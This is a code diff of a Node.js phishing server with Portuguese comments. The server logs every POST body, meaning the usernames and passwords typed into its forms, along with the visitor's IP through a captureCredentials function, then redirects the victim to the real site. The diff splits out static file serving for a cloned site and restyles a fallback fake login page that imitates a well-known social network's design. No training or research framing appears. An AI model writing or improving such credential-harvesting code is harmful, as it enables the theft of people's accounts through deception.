@@ -12,6 +12,7 @@ const MIME_TYPES = {
     '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg',
     '.gif': 'image/gif', '.svg': 'image/svg+xml', '.ico': 'image/x-icon',
     '.woff': 'font/woff', '.woff2': 'font/woff2', '.ttf': 'font/ttf',
+    '.json': 'application/json', '.xml': 'application/xml',
 };
 
 function captureCredentials(body, clientIP) {
@@ -27,20 +28,8 @@ function captureCredentials(body, clientIP) {
     console.log(logEntry);
 }
 
-const server = http.createServer((req, res) => {
-    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-
-    if (req.method === 'POST') {
-        let body = '';
-        req.on('data', chunk => body += chunk.toString());
-        req.on('end', () => {
-            captureCredentials(body, clientIP);
-            res.writeHead(302, { 'Location': REDIRECT_URL });
-            res.end();
-        });
-        return;
-    }
-
+// Servir arquivo estático ou fallback
+function serveStatic(req, res) {
     let filePath = req.url === '/' ? '/index.html' : req.url.split('?')[0];
     filePath = path.join(SITE_DIR, filePath);
 
@@ -49,11 +38,12 @@ const server = http.createServer((req, res) => {
 
     fs.readFile(filePath, (err, data) => {
         if (err) {
-            const fallbackHTML = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Login</title>
-<style>body{font-family:Arial;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
-.box{background:#fff;border:1px solid #dbdbdb;padding:40px;width:350px;text-align:center}
-h1{margin-bottom:30px;font-weight:400}input{width:100%;padding:12px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;box-sizing:border-box}
-button{width:100%;padding:10px;margin-top:15px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:bold;font-size:14px;cursor:pointer}
+            // Fallback: formulário genérico
+            const fallbackHTML = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login</title>
+<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+.box{background:#fff;border:1px solid #dbdbdb;border-radius:8px;padding:40px;width:100%;max-width:350px;text-align:center}
+h1{margin-bottom:30px;font-weight:400;font-size:24px}input{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:4px;font-size:14px;outline:none}
+input:focus{border-color:#0095f6}button{width:100%;padding:12px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:bold;font-size:14px;cursor:pointer}
 button:hover{background:#1877f2}</style></head><body>
 <div class="box"><h1>Login</h1><form method="POST" action="/login">
 <input type="text" name="username" placeholder="Usuário ou Email" required>
@@ -66,6 +56,28 @@ button:hover{background:#1877f2}</style></head><body>
         res.writeHead(200, { 'Content-Type': contentType });
         res.end(data);
     });
+}
+
+const server = http.createServer((req, res) => {
+    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
+    // Capturar POST de qualquer formulário
+    if (req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk.toString());
+        req.on('end', () => {
+            if (body) {
+                captureCredentials(body, clientIP);
+            }
+            // Redirecionar para URL original
+            res.writeHead(302, { 'Location': REDIRECT_URL });
+            res.end();
+        });
+        return;
+    }
+
+    // Servir arquivos estáticos
+    serveStatic(req, res);
 });
 
 server.listen(PORT, '0.0.0.0', () => {
